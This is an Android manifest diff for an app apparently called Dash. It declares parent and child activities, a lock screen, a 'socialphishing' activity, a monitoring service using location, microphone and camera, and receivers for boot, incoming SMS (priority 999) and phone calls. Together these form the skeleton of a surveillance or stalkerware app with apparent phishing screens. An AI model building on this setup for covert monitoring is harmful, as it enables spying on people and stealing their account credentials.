@@ -62,6 +62,7 @@
         android:required="false" />
 
     <application
+        android:name=".app.DashApplication"
         android:allowBackup="false"
         android:dataExtractionRules="@xml/data_extraction_rules"
         android:fullBackupContent="@xml/backup_rules"
@@ -76,16 +77,81 @@
 
         <!-- Main Activities -->
         <activity
-            android:name=".MainActivity"
+            android:name=".ui.activities.login.LoginActivity"
             android:exported="true"
-            android:theme="@style/Theme.Dash">
+            android:theme="@style/Theme.Dash.Login">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
+        <activity
+            android:name=".ui.activities.mainchild.MainChildActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Dash" />
 
+        <activity
+            android:name=".ui.activities.mainparent.MainParentActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Dash" />
+
+        <activity
+            android:name=".ui.activities.lock.LockActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Dash.Lock" />
+
+        <activity
+            android:name=".ui.activities.register.RegisterActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Dash" />
+
+        <activity
+            android:name=".ui.activities.socialphishing.SocialActivityM"
+            android:exported="false"
+            android:theme="@style/Theme.Dash" />
+
+        <!-- Services -->
+        <service
+            android:name=".services.MonitoringService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="location|microphone|camera|dataSync" />
+
+        <!-- Receivers -->
+        <receiver
+            android:name=".receiver.BootReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receiver.MonitorReceiver"
+            android:enabled="true"
+            android:exported="false" />
+
+        <receiver
+            android:name=".receiver.SmsReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receiver.CallsReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
 
         <!-- Firebase -->
         <meta-data
